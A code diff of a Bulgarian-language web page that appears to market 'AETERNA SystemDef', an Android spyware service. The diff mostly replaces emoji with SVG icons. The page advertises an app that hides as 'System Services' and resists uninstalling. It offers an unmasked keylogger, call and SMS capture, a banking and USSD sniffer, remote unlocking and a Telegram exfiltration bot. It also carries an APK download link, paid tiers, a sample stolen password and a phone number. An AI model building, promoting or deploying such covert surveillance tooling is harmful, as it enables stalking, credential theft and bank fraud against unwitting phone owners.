                     Системата засича опит за деинсталиране през настройките. Задейства се незабавен защитен рефлекс и връщане на началния екран.
                   </p>
@@ -1710,8 +1771,10 @@
               <!-- 6. INCOMING CALL OVERLAY -->
               <div class="call-overlay" id="call-overlay">
                 <div style="text-align: center; margin-top: 20px;">
-                  <div style="width: 60px; height: 60px; border-radius: 50%; background: #0284c7; display: flex; align-items: center; justify-content: center; font-size: 28px; margin: 0 auto 12px; box-shadow: 0 0 25px var(--cyan-glow);">👤</div>
-                  <h4 style="font-size: 18px; font-weight: 800; color: #fff;">Geneva HQ (+41 22 819)</h4>
+                  <div style="width: 56px; height: 56px; border-radius: 50%; background: #0284c7; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; color: #fff; box-shadow: 0 0 25px var(--cyan-glow);">
+                    <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                  </div>
+                  <h4 style="font-size: 17px; font-weight: 800; color: #fff;">Geneva HQ (+41 22 819)</h4>
                   <div style="font-size: 11px; color: var(--green); font-weight: 700; margin-top: 2px;">Входящо обаждане...</div>
                 </div>
 
@@ -1725,8 +1788,12 @@
                 </div>
 
                 <div style="display: flex; gap: 30px; margin-bottom: 20px;">
-                  <button onclick="endSimCall()" style="width: 50px; height: 50px; border-radius: 50%; background: var(--red); border: none; font-size: 20px; cursor: pointer; color: #fff;">📵</button>
-                  <button onclick="acceptSimCall()" style="width: 50px; height: 50px; border-radius: 50%; background: var(--green); border: none; font-size: 20px; cursor: pointer; color: #fff;">📞</button>
+                  <button onclick="endSimCall()" style="width: 48px; height: 48px; border-radius: 50%; background: var(--red); border: none; cursor: pointer; color: #fff; display: flex; align-items: center; justify-content: center;">
+                    <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"><line x1="1" y1="1" x2="23" y2="23"/><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91"/></svg>
+                  </button>
+                  <button onclick="acceptSimCall()" style="width: 48px; height: 48px; border-radius: 50%; background: var(--green); border: none; cursor: pointer; color: #fff; display: flex; align-items: center; justify-content: center;">
+                    <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                  </button>
                 </div>
               </div>
 
@@ -1742,33 +1809,48 @@
         <!-- Simulator Interactive Trigger Buttons -->
         <div class="simulator-triggers">
           <button class="btn-sim-action" onclick="triggerSimCall()">
-            <span>📞</span> <span data-i18n="sim_btn_call">Имитирай Обаждане</span>
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+            <span data-i18n="sim_btn_call">Имитирай Обаждане</span>
           </button>
           <button class="btn-sim-action" onclick="triggerSimOtp()">
-            <span>💬</span> <span data-i18n="sim_btn_sms">Прихвани 2FA SMS</span>
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+            <span data-i18n="sim_btn_sms">Прихвани 2FA SMS</span>
           </button>
           <button class="btn-sim-action" onclick="triggerSimTyping()">
-            <span>⌨️</span> <span data-i18n="sim_btn_key">Напиши Парола</span>
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="2" y="4" width="20" height="16" rx="2"/><line x1="6" y1="8" x2="6" y2="8"/><line x1="10" y1="8" x2="10" y2="8"/><line x1="14" y1="8" x2="14" y2="8"/><line x1="18" y1="8" x2="18" y2="8"/><line x1="7" y1="16" x2="17" y2="16"/></svg>
+            <span data-i18n="sim_btn_key">Напиши Парола</span>
           </button>
           <button class="btn-sim-action" onclick="triggerAntiUninstallDemo()" style="border-color: var(--red); color: var(--red);">
-            <span>🛡️</span> <span data-i18n="sim_btn_block">Тест Anti-Delete</span>
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            <span data-i18n="sim_btn_block">Тест Anti-Delete</span>
           </button>
         </div>
       </div>
 
-      <!-- 👁️ THE OBSERVER DECK (RIGHT PANEL TELEMETRY) -->
+      <!-- THE OBSERVER DECK (RIGHT PANEL TELEMETRY) -->
       <div class="observer-deck">
         <div class="observer-tabs-nav">
-          <button class="obs-tab-btn active" onclick="switchObsTab('obs-keys')">⌨️ Keylogger (Unmasked)</button>
-          <button class="obs-tab-btn" onclick="switchObsTab('obs-stream')">⚡ Raw Packet Stream</button>
-          <button class="obs-tab-btn" onclick="switchObsTab('obs-hardware')">🔋 Hardware Health</button>
+          <button class="obs-tab-btn active" onclick="switchObsTab('obs-keys')">
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="2" y="4" width="20" height="16" rx="2"/><line x1="7" y1="16" x2="17" y2="16"/></svg>
+            Keylogger (Unmasked)
+          </button>
+          <button class="obs-tab-btn" onclick="switchObsTab('obs-stream')">
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+            Raw Packet Stream
+          </button>
+          <button class="obs-tab-btn" onclick="switchObsTab('obs-hardware')">
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="1" y="6" width="18" height="12" rx="2"/><line x1="23" y1="11" x2="23" y2="13"/></svg>
+            Hardware Health
+          </button>
         </div>
 
         <!-- 1. KEYLOGGER LOG -->
         <div id="obs-keys" class="obs-tab-pane active">
-          <div style="background: rgba(0, 240, 255, 0.05); border: 1px solid var(--border); border-radius: 12px; padding: 12px 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center;">
+          <div style="background: rgba(0, 240, 255, 0.04); border: 1px solid var(--border); border-radius: 12px; padding: 12px 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center;">
             <span style="font-size: 11px; font-family: 'JetBrains Mono', monospace; color: var(--cyan);">DECRYPTED KEYBOARD INGESTION</span>
-            <span style="font-size: 10px; color: var(--green); font-weight: 800;">LIVE ACTIVE</span>
+            <span style="font-size: 10px; color: var(--green); font-weight: 800; display: flex; align-items: center; gap: 6px;">
+              <span class="pulse-dot" style="width: 6px; height: 6px;"></span> LIVE ACTIVE
+            </span>
           </div>
 
           <div class="live-stream-box" id="key-stream-box">
@@ -1785,7 +1867,7 @@
             <div class="packet-row" style="background: rgba(244, 63, 94, 0.1); padding: 4px 6px; border-radius: 4px;">
               <span style="color: var(--red); font-weight: 800;">[UNMASKED PWD]</span>
               <span style="color: #fff;">Password: <strong>S0ver3ign2026!</strong></span>
-              <span style="color: var(--green); font-size: 10px;">✔ Декодирано от звездички</span>
+              <span style="color: var(--green); font-size: 10px;">Декодирано от звездички</span>
             </div>
           </div>
         </div>
@@ -1820,19 +1902,29 @@
           </div>
 
           <div style="background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 14px; margin-top: 14px;">
-            <div style="font-size: 12px; font-weight: 700; color: #fff; margin-bottom: 6px;">Хардуерни Гаранции за Невидимост:</div>
-            <ul style="font-size: 11px; color: var(--text-dim); list-style: none; line-height: 1.8;">
-              <li>✔ <strong>Без затопляне:</strong> Процесорното натоварване е 0.00% в състояние на покой (Zero-Entropy).</li>
-              <li>✔ <strong>Скрита икона:</strong> Маскиран като стандартна системна услуга <code>System Services</code>.</li>
-              <li>✔ <strong>Защитен от деинсталиране:</strong> Автоматично блокира влизането в менюто за изтриване.</li>
+            <div style="font-size: 12px; font-weight: 700; color: #fff; margin-bottom: 8px;">Хардуерни Гаранции за Невидимост:</div>
+            <ul style="font-size: 12px; color: var(--text-dim); list-style: none; line-height: 1.8;">
+              <li style="display: flex; align-items: center; gap: 8px;">
+                <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--green)"><polyline points="20 6 9 17 4 12"/></svg>
+                <span><strong>Без затопляне:</strong> Процесорното натоварване е 0.00% в състояние на покой (Zero-Entropy).</span>
+              </li>
+              <li style="display: flex; align-items: center; gap: 8px;">
+                <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--green)"><polyline points="20 6 9 17 4 12"/></svg>
+                <span><strong>Скрита икона:</strong> Маскиран като стандартна системна услуга <code>System Services</code>.</span>
+              </li>
+              <li style="display: flex; align-items: center; gap: 8px;">
+                <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--green)"><polyline points="20 6 9 17 4 12"/></svg>
+                <span><strong>Защитен от деинсталиране:</strong> Автоматично блокира влизането в менюто за изтриване.</span>
+              </li>
             </ul>
           </div>
         </div>
 
         <!-- Live Device Link Preview Box -->
-        <div style="background: linear-gradient(135deg, rgba(0, 240, 255, 0.06), rgba(16, 185, 129, 0.06)); border: 1px solid var(--cyan); border-radius: 16px; padding: 16px;">
-          <div style="font-size: 11px; font-weight: 800; color: var(--cyan); letter-spacing: 1px; margin-bottom: 4px;">
-            🔗 АВТОНОМНО ГЕНЕРИРАН ЛИНК ЗА ТАЗИ СЕСИЯ:
+        <div style="background: linear-gradient(135deg, rgba(0, 240, 255, 0.04), rgba(16, 185, 129, 0.04)); border: 1px solid var(--border); border-radius: 16px; padding: 16px;">
+          <div style="font-size: 11px; font-weight: 800; color: var(--cyan); letter-spacing: 1px; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;">
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+            АВТОНОМНО ГЕНЕРИРАН ЛИНК ЗА ТАЗИ СЕСИЯ:
           </div>
           <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #fff; background: rgba(0,0,0,0.5); padding: 8px 12px; border-radius: 8px; border: 1px dashed var(--border); word-break: break-all;">
             https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026
@@ -1865,7 +1957,9 @@
           <div class="terminal-dot dot-green"></div>
         </div>
         <div class="terminal-title">AETERNA_DEPLOYMENT_ENGINE // BASH_V8</div>
-        <div style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--green);">STATUS: READY</div>
+        <div style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--green); display: flex; align-items: center; gap: 6px;">
+          <span class="pulse-dot" style="width: 6px; height: 6px;"></span> STATUS: READY
+        </div>
       </div>
 
       <div class="terminal-body" id="deployment-term-body">
@@ -1874,14 +1968,14 @@
           <span class="term-cmd">./aeterna_fleet_deploy.sh --target-asset="Android_SM-S928B"</span>
         </div>
         <div class="term-line"><span class="term-info">[1/5] Проверка на инсталационния пакет AETERNA_SYSTEMDEF_INSTALLER.apk...</span></div>
-        <div class="term-line"><span class="term-success"> ✔ Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>
+        <div class="term-line"><span class="term-success"> [OK] Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>
         <div class="term-line"><span class="term-info">[2/5] Стартиране на системна услуга 'System Services' и маскиране...</span></div>
-        <div class="term-line"><span class="term-success"> ✔ Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>
+        <div class="term-line"><span class="term-success"> [OK] Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>
         <div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@Shanoto7bot)...</span></div>
-        <div class="term-line"><span class="term-success"> ✔ Създаден нов Topic/стая в супергрупа 'Scan': 📱 samsung SM-S928B (+359896849882).</span></div>
+        <div class="term-line"><span class="term-success"> [OK] Създаден нов Topic/стая в супергрупа 'Scan': samsung SM-S928B (+359896849882).</span></div>
         <div class="term-line"><span class="term-info">[4/5] Генериране на изолиран клиентски Web HUD...</span></div>
         <div class="term-line" style="color: var(--cyan); font-weight: 700;">
-          <span> 🔗 ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span>
+          <span> ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span>
           <span style="text-decoration: underline;">https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026</span>
         </div>
         <div class="term-line"><span class="term-success">[5/5] Ентропията е свита до 0.0000. Системата е в готовност.</span></div>
@@ -1892,7 +1986,8 @@
           Всяка инсталация автоматично генерира свой самостоятелен линк и Telegram тема.
         </div>
         <button class="btn-term-action" onclick="replayTerminalSequence()">
-          <span>🔄</span> <span data-i18n="term_btn_replay">Повтори Симулацията</span>
+          <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+          <span data-i18n="term_btn_replay">Повтори Симулацията</span>
         </button>
       </div>
     </div>
@@ -1905,7 +2000,8 @@
       <div class="download-card">
         <div>
           <div class="apk-meta-badge">
-            <span>🛡️</span> 100% CLEAN // NO METADATA LEAK
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            100% VERIFIED BINARY // ZERO LEAK
           </div>
           <h3 style="font-size: 26px; font-weight: 800; color: #fff; margin-bottom: 8px;">
             AETERNA SystemDef Installer
@@ -1924,7 +2020,8 @@
         </div>
 
         <a href="AETERNA_SYSTEMDEF_INSTALLER.apk" download="AETERNA_SYSTEMDEF_INSTALLER.apk" class="btn-download-apk">
-          <span>📥</span> <span>СВАЛИ ОФИЦИАЛНИЯ APK (6.74 MB)</span>
+          <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          <span>СВАЛИ ОФИЦИАЛНИЯ APK (6.74 MB)</span>
         </a>
       </div>
 
@@ -1986,11 +2083,26 @@
           <div class="plan-price">€49 <span>/ месец</span></div>
 
           <ul class="plan-features">
-            <li><span>✔</span> 1 Активно Устройство</li>
-            <li><span>✔</span> Live Mirroring на Екрана</li>
-            <li><span>✔</span> Пълен Unmasked Keylogger</li>
-            <li><span>✔</span> Запис на Разговори & SMS</li>
-            <li><span>✔</span> Собствен Telegram Бот Канал</li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>1 Активно Устройство</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Live Mirroring на Екрана</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Пълен Unmasked Keylogger</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Запис на Разговори & SMS</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Собствен Telegram Бот Канал</span>
+            </li>
           </ul>
         </div>
         <button class="btn-plan" onclick="openAuthModal()">Активирай Лиценз</button>
@@ -2005,12 +2117,30 @@
           <div class="plan-price">€199 <span>/ месец</span></div>
 
           <ul class="plan-features">
-            <li><span>✔</span> До 5 Наблюдавани Устройства</li>
-            <li><span>✔</span> Изолирани Сесии за Всяко Устройство</li>
-            <li><span>✔</span> Отдалечен Тъч и Жестове (Remote Control)</li>
-            <li><span>✔</span> Пълен Банков & USSD Sniffer</li>
-            <li><span>✔</span> Приоритетен 35ms WebSocket Мост</li>
-            <li><span>✔</span> Защита от Деинсталиране (Home-Lock)</li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>До 5 Наблюдавани Устройства</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Изолирани Сесии за Всяко Устройство</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Отдалечен Тъч и Жестове (Remote Control)</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Пълен Банков & USSD Sniffer</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Приоритетен 35ms WebSocket Мост</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Защита от Деинсталиране (Home-Lock)</span>
+            </li>
           </ul>
         </div>
         <button class="btn-plan featured" onclick="openAuthModal()">Избери Fleet Pro</button>
@@ -2024,11 +2154,26 @@
           <div class="plan-price">По договаряне</div>
 
           <ul class="plan-features">
-            <li><span>✔</span> Неограничен Брой Устройства</li>
-            <li><span>✔</span> Master Sovereign HUD (Главен панел)</li>
-            <li><span>✔</span> Собствен Домейн и Частен Сървър</li>
-            <li><span>✔</span> Директно ADB Хардуерно Управление</li>
-            <li><span>✔</span> Пълна Невидимост и Персонализирани Икони</li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Неограничен Брой Устройства</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Master Sovereign HUD (Главен панел)</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Собствен Домейн и Частен Сървър</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Директно ADB Хардуерно Управление</span>
+            </li>
+            <li>
+              <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Пълна Невидимост и Персонализирани Икони</span>
+            </li>
           </ul>
         </div>
         <button class="btn-plan" onclick="openAuthModal()">Свържи се с Нас</button>
@@ -2043,7 +2188,9 @@
   <div id="auth-modal">
     <div class="auth-modal-card">
       <button class="modal-close-btn" onclick="closeAuthModal()">✕</button>
-      <div style="font-size: 36px; margin-bottom: 12px;">🛡️</div>
+      <div class="modal-logo-icon">
+        <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      </div>
       <h3 class="modal-logo">AETERNA // SYSTEMDEF</h3>
       <p style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 1px;">
         SOVEREIGN CLIENT & ARCHITECT VAULT
@@ -2072,17 +2219,19 @@
       <div>
         <h1 style="font-size: 20px; font-weight: 900; color: var(--cyan);">AETERNA // SYSTEMDEF VAULT</h1>
         <div style="display: flex; align-items: center; gap: 10px; margin-top: 4px; flex-wrap: wrap;">
-          <label style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); font-weight: 700;">📱 DEVICE SESSION:</label>
+          <label style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); font-weight: 700;">DEVICE SESSION:</label>
           <select id="device-selector" onchange="onDeviceSelected()" style="background: var(--card); border: 1px solid var(--cyan); color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 11px; padding: 4px 10px; border-radius: 6px; outline: none; cursor: pointer;">
-            <option value="ALL">🌐 ALL DEVICES (Unified Fleet)</option>
-            <option value="RZCX326316L" selected>🟢 Samsung Galaxy S24 Ultra (SM-S928B)</option>
+            <option value="ALL">ALL DEVICES (Unified Fleet)</option>
+            <option value="RZCX326316L" selected>Samsung Galaxy S24 Ultra (SM-S928B)</option>
           </select>
-          <button id="btn-copy-session" onclick="copyCurrentSessionLink()" style="background: rgba(0, 240, 255, 0.12); border: 1px solid var(--cyan); color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 6px; cursor: pointer;">🔗 Копирай линк за тази сесия</button>
+          <button id="btn-copy-session" onclick="copyCurrentSessionLink()" style="background: rgba(0, 240, 255, 0.12); border: 1px solid var(--cyan); color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 6px; cursor: pointer;">
+            Копирай линк за тази сесия
+          </button>
         </div>
       </div>
       <div style="display: flex; gap: 12px; align-items: center;">
         <div class="status-pill" id="role-indicator-pill" style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.4);">
-          <span style="font-size: 11px; color: var(--gold); font-weight: 800;" id="role-indicator">👑 MASTER HUD</span>
+          <span style="font-size: 11px; color: var(--gold); font-weight: 800;" id="role-indicator">MASTER HUD</span>
         </div>
         <div class="status-pill" id="fleet-count-pill" style="background: rgba(0, 240, 255, 0.08); border: 1px solid rgba(0, 240, 255, 0.3);">
           <span style="font-size: 11px; color: var(--cyan); font-weight: 800;" id="fleet-count">1 Active Device</span>
@@ -2091,32 +2240,39 @@
           <div class="pulse-dot"></div>
           <span id="live-records-count">INGESTION ACTIVE</span>
         </div>
-        <button onclick="logoutVault()" style="background: transparent; border: 1px solid rgba(244, 63, 94, 0.4); color: var(--red); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: 4px 8px; border-radius: 6px; cursor: pointer;">🚪 Изход</button>
+        <button onclick="logoutVault()" style="background: transparent; border: 1px solid rgba(244, 63, 94, 0.4); color: var(--red); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: 4px 8px; border-radius: 6px; cursor: pointer;">Изход</button>
       </div>
     </div>
 
     <!-- TABS -->
     <div class="tabs-bar">
       <button class="tab-btn active" onclick="switchTab('tab-mirror')">
-        📱 Live Mirror
+        <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+        Live Mirror
       </button>
       <button class="tab-btn" onclick="switchTab('tab-telegram')">
-        💬 Telegram Feed <span class="tab-badge" id="badge-events">0</span>
+        <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+        Telegram Feed <span class="tab-badge" id="badge-events">0</span>
       </button>
       <button class="tab-btn" onclick="switchTab('tab-notifs')">
-        🔔 Notifications <span class="tab-badge" id="badge-notifs">0</span>
+        <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+        Notifications <span class="tab-badge" id="badge-notifs">0</span>
       </button>
       <button class="tab-btn" onclick="switchTab('tab-calls')">
-        📞 Calls <span class="tab-badge" id="badge-calls">0</span>
+        <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+        Calls <span class="tab-badge" id="badge-calls">0</span>
       </button>
       <button class="tab-btn" onclick="switchTab('tab-sms')">
-        💬 SMS <span class="tab-badge" id="badge-sms">0</span>
+        <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+        SMS <span class="tab-badge" id="badge-sms">0</span>
       </button>
       <button class="tab-btn" onclick="switchTab('tab-contacts')">
-        👥 Contacts & Chats <span class="tab-badge" id="badge-contacts">0</span>
+        <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+        Contacts & Chats <span class="tab-badge" id="badge-contacts">0</span>
       </button>
       <button class="tab-btn" onclick="switchTab('tab-keylog')">
-        ⌨️ Keylogs <span class="tab-badge" id="badge-keylogs">0</span>
+        <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="2" y="4" width="20" height="16" rx="2"/><line x1="7" y1="16" x2="17" y2="16"/></svg>
+        Keylogs <span class="tab-badge" id="badge-keylogs">0</span>
       </button>
     </div>
 
@@ -2141,12 +2297,12 @@
             <div class="ctrl-row">
               <button class="btn-ctrl" onclick="sendSwipeGesture('UP')">⬆ Скрол Нагоре</button>
               <button class="btn-ctrl" onclick="sendSwipeGesture('DOWN')">⬇ Скрол Надолу</button>
-              <button class="btn-ctrl" onclick="sendDeviceKey('POWER')">⚡ Захранване</button>
+              <button class="btn-ctrl" onclick="sendDeviceKey('POWER')">Захранване</button>
             </div>
             <div class="ctrl-row" style="margin-top: 4px;">
               <input type="text" id="type-text-input" placeholder="Въведи текст / ПИН..." style="flex: 2; background: #020408; border: 1px solid var(--border); border-radius: 6px; padding: 6px 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #fff; outline: none;">
-              <button class="btn-ctrl" onclick="sendTypeText()" style="flex: 1;">⌨ Въведи</button>
-              <button class="btn-ctrl" onclick="unlockPhone()" style="flex: 1; border-color: var(--green); color: var(--green);">🔓 Отключи</button>
+              <button class="btn-ctrl" onclick="sendTypeText()" style="flex: 1;">Въведи</button>
+              <button class="btn-ctrl" onclick="unlockPhone()" style="flex: 1; border-color: var(--green); color: var(--green);">Отключи</button>
             </div>
           </div>
         </div>
@@ -2170,7 +2326,7 @@
           <!-- Real-Time Activity Log -->
           <div style="background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 16px; flex: 1; min-height: 380px; display: flex; flex-direction: column;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
-              <span style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--gold); font-weight: 700;">⚡ LIVE RECENT FEED</span>
